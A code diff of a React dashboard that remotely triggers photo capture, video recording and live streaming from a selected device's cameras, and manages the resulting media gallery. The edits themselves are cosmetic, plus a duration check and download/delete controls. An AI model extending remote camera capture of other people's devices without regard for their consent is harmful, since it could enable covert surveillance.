@@ -233,8 +233,8 @@ export default function Home() {
     const [isRecording, setIsRecording] = useState(false);
     const [isLiveStreaming, setIsLiveStreaming] = useState(false);
     const [liveFrame, setLiveFrame] = useState<string | null>(null);
-    const [recordingDuration, setRecordingDuration] = useState(60); // Default 1 min
     const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
+    const [recordingDuration, setRecordingDuration] = useState<number>(0);
     const [capturedMedia, setCapturedMedia] = useState<{ type: string; data: string; camera: string; timestamp: number }[]>([]);
     const [cameraError, setCameraError] = useState<string | null>(null);
     const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
@@ -1654,15 +1654,15 @@ END:VCARD`;
                 );
             case 'camera':
                 return (
-                    <div className={`space-y-6 animate-in fade-in zoom-in-95 duration-300 ${isCameraFullscreen ? 'fixed inset-0 z-[300] bg-[#0a0a0c] p-4 md:p-8' : ''}`}>
+                    <div className={`space-y-6 ${isCameraFullscreen ? 'fixed inset-0 z-[300] bg-[#0a0a0c] p-4 md:p-8' : ''}`}>
                         <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 bg-white/5 px-6 py-4 rounded-[2rem] border border-white/10 shadow-neo-xl">
                             <div className="flex flex-wrap items-center gap-3 w-full justify-between">
                                 <div className="flex items-center bg-black/40 border border-white/10 p-1.5 rounded-2xl w-full sm:w-auto justify-center sm:justify-start">
-                                    <button onClick={() => setCameraMode('back')} className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all ${cameraMode === 'back' ? 'bg-cyan-500 text-black shadow-[0_0_15px_rgba(6,182,212,0.4)]' : 'text-white/50 hover:text-white hover:bg-white/5'}`}>Rear Camera</button>
-                                    <button onClick={() => setCameraMode('front')} className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all ${cameraMode === 'front' ? 'bg-cyan-500 text-black shadow-[0_0_15px_rgba(6,182,212,0.4)]' : 'text-white/50 hover:text-white hover:bg-white/5'}`}>Front Camera</button>
+                                    <button onClick={() => setCameraMode('back')} className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold ${cameraMode === 'back' ? 'bg-cyan-500 text-black' : 'text-white/50'}`}>Rear Camera</button>
+                                    <button onClick={() => setCameraMode('front')} className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold ${cameraMode === 'front' ? 'bg-cyan-500 text-black' : 'text-white/50'}`}>Front Camera</button>
                                 </div>
                                 {isCameraFullscreen && (
-                                    <button onClick={() => setIsCameraFullscreen(false)} className="w-12 h-12 flex items-center justify-center rounded-2xl bg-white/10 text-white hover:bg-white/20 transition-all border border-white/10 shadow-neo-lg">
+                                    <button onClick={() => setIsCameraFullscreen(false)} className="w-12 h-12 flex items-center justify-center rounded-2xl bg-white/10 text-white border border-white/10">
                                         <Minimize size={20} />
                                     </button>
                                 )}
@@ -1672,27 +1672,25 @@ END:VCARD`;
                         <div className={`grid grid-cols-1 ${isCameraFullscreen ? 'h-[calc(100%-100px)]' : 'lg:grid-cols-3'} gap-6`}>
                             {/* Main Stage */}
                             <div className={`flex flex-col gap-4 ${isCameraFullscreen ? 'h-full' : 'lg:col-span-2'}`}>
-                                <div className={`w-full bg-black rounded-[2rem] border-2 overflow-hidden relative flex items-center justify-center transition-all ${isLiveStreaming ? 'border-red-500/50 shadow-[0_0_30px_rgba(239,68,68,0.2)]' : isRecording ? 'border-red-500 shadow-[0_0_40px_rgba(239,68,68,0.3)]' : 'border-white/10 shadow-neo-2xl'} ${isCameraFullscreen ? 'h-full flex-1' : 'aspect-video'}`}>
+                                <div className={`w-full bg-black rounded-[2rem] border-2 overflow-hidden relative flex items-center justify-center border-white/10 ${isCameraFullscreen ? 'h-full flex-1' : 'aspect-video'}`}>
                                     {isLiveStreaming ? (
                                         liveFrame ? (
                                             <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live Feed" />
                                         ) : (
-                                            <div className="absolute inset-0 flex items-center justify-center bg-cyan-500/5 backdrop-blur-md">
+                                            <div className="absolute inset-0 flex items-center justify-center bg-cyan-500/5">
                                                 <div className="flex flex-col items-center gap-6">
                                                     <div className="w-24 h-24 rounded-full bg-cyan-500/20 flex items-center justify-center border border-cyan-500/30">
-                                                        <div className="w-16 h-16 rounded-full bg-cyan-500/40 animate-ping flex items-center justify-center" />
-                                                        <Video className="w-8 h-8 text-cyan-400 absolute" />
+                                                        <Video className="w-8 h-8 text-cyan-400" />
                                                     </div>
                                                     <span className="text-cyan-400 font-bold tracking-[0.2em] uppercase text-sm">Initializing Feed...</span>
                                                 </div>
                                             </div>
                                         )
                                     ) : isRecording ? (
-                                        <div className="absolute inset-0 flex items-center justify-center bg-red-500/5 backdrop-blur-md">
+                                        <div className="absolute inset-0 flex items-center justify-center bg-red-500/5">
                                             <div className="flex flex-col items-center gap-6">
                                                 <div className="w-24 h-24 rounded-full bg-red-500/20 flex items-center justify-center border border-red-500/30">
-                                                    <div className="w-16 h-16 rounded-full bg-red-500/40 animate-ping flex items-center justify-center" />
-                                                    <Square className="w-8 h-8 text-red-400 absolute" />
+                                                    <Square className="w-8 h-8 text-red-400" />
                                                 </div>
                                                 <div className="flex flex-col items-center gap-2">
                                                     <span className="text-red-400 font-bold tracking-[0.2em] uppercase text-sm">Recording in Progress</span>
@@ -1711,15 +1709,15 @@ END:VCARD`;
                                     <div className="absolute top-6 left-6 right-6 flex items-center justify-between pointer-events-none">
                                         <div className="flex items-center gap-3">
                                             {isLiveStreaming && (
-                                                <div className="flex items-center gap-3 bg-black/60 backdrop-blur-xl px-4 py-2 rounded-full border border-red-500/30 shadow-[0_0_15px_rgba(239,68,68,0.2)] pointer-events-auto">
-                                                    <div className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse" />
+                                                <div className="flex items-center gap-3 bg-black/60 px-4 py-2 rounded-full border border-red-500/30 pointer-events-auto">
+                                                    <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
                                                     <span className="text-xs font-bold text-white tracking-widest font-data">LIVE {cameraQuality}p</span>
                                                 </div>
                                             )}
                                         </div>
                                         <div className="flex items-center gap-3 pointer-events-auto">
                                             {!isCameraFullscreen && (
-                                                <button onClick={() => setIsCameraFullscreen(true)} className="w-10 h-10 rounded-full bg-black/60 backdrop-blur-xl flex items-center justify-center border border-white/10 text-white/70 hover:text-white hover:bg-white/20 transition-all">
+                                                <button onClick={() => setIsCameraFullscreen(true)} className="w-10 h-10 rounded-full bg-black/60 flex items-center justify-center border border-white/10 text-white/70">
                                                     <Maximize size={18} />
                                                 </button>
                                             )}
@@ -1728,7 +1726,7 @@ END:VCARD`;
 
                                 </div>
 
-                                {/* Action Bar - Moved outside video block */}
+                                {/* Action Bar */}
                                 <div className="flex items-center justify-center gap-8 py-2">
                                     <button 
                                         onClick={() => {
@@ -1746,10 +1744,10 @@ END:VCARD`;
                                                 setLiveFrame(null);
                                             }
                                         }}
-                                        className={`w-16 h-16 rounded-3xl flex flex-col items-center justify-center gap-1.5 transition-all ${isLiveStreaming ? 'bg-red-500 text-white shadow-[0_0_30px_rgba(239,68,68,0.4)] scale-105' : 'bg-white/5 text-white/70 hover:text-white hover:bg-white/10 border border-white/5'}`}
+                                        className={`w-16 h-16 rounded-3xl flex flex-col items-center justify-center gap-1.5 ${isLiveStreaming ? 'bg-red-500 text-white' : 'bg-white/5 text-white/70 border border-white/5'}`}
                                         title="Live Stream"
                                     >
-                                        <Video size={24} className={isLiveStreaming ? 'animate-pulse' : ''} />
+                                        <Video size={24} />
                                         <span className="text-[10px] font-bold tracking-widest uppercase">{isLiveStreaming ? 'Stop' : 'Live'}</span>
                                     </button>
                                     
@@ -1764,13 +1762,13 @@ END:VCARD`;
                                             socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode }); 
                                         }}
                                         disabled={isCapturingPhoto}
-                                        className={`w-24 h-24 rounded-full flex items-center justify-center border-[6px] transition-all group ${isCapturingPhoto ? 'border-cyan-500 bg-cyan-500/20' : 'border-white bg-white/5 hover:bg-white/10 hover:scale-105'} shadow-[0_0_40px_rgba(255,255,255,0.1)]`}
+                                        className={`w-24 h-24 rounded-full flex items-center justify-center border-[6px] ${isCapturingPhoto ? 'border-cyan-500 bg-cyan-500/20' : 'border-white bg-white/5'}`}
                                         title="Capture Photo"
                                     >
                                         {isCapturingPhoto ? (
                                             <RefreshCw className="animate-spin text-cyan-400" size={32}/>
                                         ) : (
-                                            <div className="w-[72px] h-[72px] rounded-full bg-white group-active:scale-90 transition-transform" />
+                                            <div className="w-[72px] h-[72px] rounded-full bg-white" />
                                         )}
                                     </button>
 
@@ -1779,6 +1777,10 @@ END:VCARD`;
                                             const device = devices.find(d => d.deviceId === selectedDeviceId);
                                             if (!device?.online) {
                                                 setAlertData({ title: 'Device Offline', message: 'Cannot record video on an offline device.', type: 'error' });
+                                                return;
+                                            }
+                                            if (!recordingDuration || recordingDuration === 0) {
+                                                setAlertData({ title: 'Select Duration', message: 'First select the recording duration.', type: 'warning' });
                                                 return;
                                             }
                                             if (isRecording) {
@@ -1790,10 +1792,10 @@ END:VCARD`;
                                                 socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
                                             }
                                         }}
-                                        className={`w-16 h-16 rounded-3xl flex flex-col items-center justify-center gap-1.5 transition-all ${isRecording ? 'bg-black text-white border-2 border-red-500 shadow-[0_0_30px_rgba(239,68,68,0.4)] scale-105' : 'bg-white/5 text-white/70 hover:text-white hover:bg-white/10 border border-white/5'}`}
+                                        className={`w-16 h-16 rounded-3xl flex flex-col items-center justify-center gap-1.5 ${isRecording ? 'bg-black text-white border-2 border-red-500' : 'bg-white/5 text-white/70 border border-white/5'}`}
                                         title="Record Video"
                                     >
-                                        <div className={`w-5 h-5 rounded-full ${isRecording ? 'bg-red-500 animate-pulse' : 'bg-red-500'}`} />
+                                        <div className={`w-5 h-5 rounded-full ${isRecording ? 'bg-red-500' : 'bg-red-500'}`} />
                                         <span className="text-[10px] font-bold tracking-widest uppercase">{isRecording ? 'Stop' : 'REC'}</span>
                                     </button>
                                 </div>
@@ -1816,6 +1818,7 @@ END:VCARD`;
                                     <div className="flex items-center gap-3 bg-black/40 px-4 py-2 rounded-xl border border-white/5 hover:border-red-500/30 transition-colors">
                                         <label className="text-xs font-bold text-white/70 uppercase tracking-widest hidden sm:inline">Duration:</label>
                                         <select value={recordingDuration} onChange={(e) => setRecordingDuration(Number(e.target.value))} className="bg-transparent text-sm font-bold text-white focus:outline-none cursor-pointer">
+                                            <option value={0} disabled className="bg-black">Select Duration</option>
                                             <option value={30} className="bg-black">30 Sec</option>
                                             <option value={60} className="bg-black">1 Min</option>
                                             <option value={120} className="bg-black">2 Mins</option>
@@ -1838,34 +1841,47 @@ END:VCARD`;
                                                 <p className="text-[10px] text-pink-400 font-data tracking-widest uppercase">From Camera</p>
                                             </div>
                                         </div>
-                                        <button onClick={() => { setSelectedTool('gallery'); setActiveTab('all'); }} className="text-xs text-white bg-white/10 hover:bg-white/20 px-4 py-2 rounded-xl font-bold transition-all shadow-lg border border-white/5">
-                                            Full Gallery &rarr;
-                                        </button>
                                     </div>
-                                    <div className="flex-1 overflow-y-auto custom-scrollbar flex flex-col gap-4 pr-2 pb-4">
-                                        {filteredImages.slice(0, 6).map((img: any) => (
-                                            <div key={img.id} className="relative rounded-2xl overflow-hidden group cursor-pointer flex-shrink-0 border border-white/5 hover:border-pink-500/50 transition-all hover:shadow-[0_0_20px_rgba(236,72,153,0.15)] shadow-xl" onClick={() => { setSelectedTool('gallery'); setActiveTab('all'); }}>
-                                                {img.resource_type === 'video' ? (
-                                                    <div className="aspect-video relative">
+                                    <div className="flex-1 overflow-y-auto custom-scrollbar pr-2 pb-4">
+                                        <div className="grid grid-cols-2 gap-3">
+                                            {filteredImages.slice(0, 10).map((img: any) => (
+                                                <div key={img.id} className="relative rounded-xl overflow-hidden group border border-white/5 hover:border-pink-500/50 transition-all hover:shadow-[0_0_15px_rgba(236,72,153,0.15)] bg-black/50 aspect-square">
+                                                    {img.resource_type === 'video' ? (
                                                         <video src={img.url} className="w-full h-full object-cover" />
-                                                        <div className="absolute inset-0 flex items-center justify-center bg-black/20">
-                                                            <div className="w-10 h-10 rounded-full bg-black/60 flex items-center justify-center backdrop-blur-md">
-                                                                <Play size={16} className="text-white ml-1" />
-                                                            </div>
-                                                        </div>
-                                                    </div>
-                                                ) : (
-                                                    <div className="aspect-square relative">
+                                                    ) : (
                                                         <img src={img.url} alt="Recent" className="w-full h-full object-cover" />
+                                                    )}
+                                                    
+                                                    {/* Media Overlay Controls */}
+                                                    <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 transition-opacity flex flex-col items-center justify-center gap-2 backdrop-blur-sm p-2">
+                                                        <a href={img.url} download target="_blank" rel="noreferrer" className="w-full py-1.5 flex justify-center items-center gap-1.5 bg-white/20 hover:bg-white/30 text-white rounded-lg text-[10px] font-bold transition-colors">
+                                                            <Download size={12} /> Download
+                                                        </a>
+                                                        <button 
+                                                            onClick={(e) => {
+                                                                e.stopPropagation();
+                                                                if(confirm('Delete this media?')) {
+                                                                    setImages(prev => prev.filter((i: any) => i.id !== img.id));
+                                                                    fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: [img.id] }) }).catch(()=>null);
+                                                                }
+                                                            }} 
+                                                            className="w-full py-1.5 flex justify-center items-center gap-1.5 bg-red-500/20 hover:bg-red-500/40 text-red-100 rounded-lg text-[10px] font-bold transition-colors"
+                                                        >
+                                                            <Trash2 size={12} /> Delete
+                                                        </button>
                                                     </div>
-                                                )}
-                                                <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center backdrop-blur-sm">
-                                                    <span className="text-xs font-bold text-white bg-pink-500 px-4 py-2 rounded-xl shadow-lg">View in Gallery</span>
+                                                    
+                                                    {/* Video Indicator */}
+                                                    {img.resource_type === 'video' && (
+                                                        <div className="absolute top-1 left-1 bg-black/60 rounded px-1 py-0.5 pointer-events-none">
+                                                            <Video size={10} className="text-white" />
+                                                        </div>
+                                                    )}
                                                 </div>
-                                            </div>
-                                        ))}
+                                            ))}
+                                        </div>
                                         {filteredImages.length === 0 && (
-                                            <div className="flex-1 flex flex-col items-center justify-center text-white/30 text-center gap-3 p-4 min-h-[200px] bg-white/5 rounded-2xl border border-white/5 border-dashed">
+                                            <div className="w-full flex flex-col items-center justify-center text-white/30 text-center gap-3 p-4 min-h-[200px] bg-white/5 rounded-2xl border border-white/5 border-dashed mt-2">
                                                 <Camera size={40} strokeWidth={1} />
                                                 <p className="text-xs font-medium">No recent captures.<br/>Snap a photo or record a video!</p>
                                             </div>
